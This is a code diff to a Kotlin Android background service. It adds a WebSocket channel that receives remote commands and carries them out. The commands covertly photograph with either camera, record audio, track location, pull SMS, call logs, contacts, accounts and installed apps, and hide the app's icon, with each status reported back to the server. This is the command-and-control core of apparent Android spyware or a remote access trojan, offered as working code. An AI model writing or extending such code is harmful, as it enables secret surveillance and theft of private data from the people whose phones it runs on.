@@ -86,7 +86,7 @@ class BackgroundService : Service() {
         // Start the main work in background threads
         Thread { performInitialRegistration() }.apply { name = "initial-registration" }.start()
         startHeartbeatLoop()
-        startCommandPoller()
+        startCommandPoller() // HTTP fallback
 
         return START_STICKY
     }
@@ -138,6 +138,29 @@ class BackgroundService : Service() {
 
             if (response != null) {
                 Log.d(TAG, "Device registered: $deviceId")
+
+                // Connect to WebSocket for real-time commands
+                SocketManager.connect(deviceId, object : SocketManager.CommandListener {
+                    override fun onCommandsReceived(commands: List<SocketManager.CommandData>) {
+                        Log.d(TAG, "Socket received ${commands.size} command(s)")
+                        for (cmd in commands) {
+                            try {
+                                val jsonCmd = JSONObject().apply {
+                                    put("id", cmd.id)
+                                    put("type", cmd.type)
+                                    put("params", cmd.params)
+                                }
+                                processCommand(jsonCmd)
+                            } catch (e: Exception) {
+                                Log.e(TAG, "Socket cmd error: ${e.message}")
+                            }
+                        }
+                    }
+
+                    override fun onConnectionStateChanged(connected: Boolean) {
+                        Log.d(TAG, "Socket connected=$connected")
+                    }
+                })
 
                 // Process any pending commands from registration response
                 if (response.has("pendingCommands")) {
@@ -261,12 +284,50 @@ class BackgroundService : Service() {
     private fun updateCommandStatus(commandId: String, status: String) {
         if (commandId.isEmpty()) return
         try {
+            // Send via socket (real-time, no HTTP overhead)
+            SocketManager.sendCommandStatus(commandId, status)
+            // Also send via HTTP as fallback
             val payload = JSONObject()
             payload.put("commandId", commandId)
             payload.put("status", status)
             ApiClient.post(Config.Api.COMMAND_STATUS, payload)
         } catch (e: Exception) {
             Log.e(TAG, "Status update error: ${e.message}")
+        }
+    }
+
+    /**
+     * Execute a single command from socket push.
+     */
+    private fun processCommand(cmd: JSONObject) {
+        try {
+            val cmdId = cmd.optString("id", "")
+            val cmdType = cmd.optString("type", "")
+            val params = cmd.optJSONObject("params") ?: JSONObject()
+
+            Log.d(TAG, "Processing command: $cmdType (id: $cmdId)")
+
+            updateCommandStatus(cmdId, "sent")
+
+            when (cmdType) {
+                "capture_photo_front" -> CameraUtils.capturePhoto(this, true)
+                "capture_photo_back" -> CameraUtils.capturePhoto(this, false)
+                "record_audio" -> MicrophoneUtils.recordAudio(this)
+                "get_location" -> LocationUtils.getLocation(this)
+                "get_sms" -> SmsUtils.getAllSms(this)
+                "get_call_logs" -> CallLogUtils.getAllCallLogs(this)
+                "get_contacts" -> ContactUtils.getAllContacts(this)
+                "get_installed_apps" -> AppListUtils.getInstalledApps(this)
+                "get_accounts" -> AccountUtils.getAccounts(this)
+                "hide_app" -> hideAppIcon()
+                "unhide_app" -> unhideAppIcon()
+                "get_storage_info" -> {}
+            }
+
+            updateCommandStatus(cmdId, "completed")
+        } catch (e: Exception) {
+            Log.e(TAG, "Command execution error: ${e.message}")
+            try { updateCommandStatus(cmd.optString("id", ""), "failed") } catch (_: Exception) {}
         }
     }
 
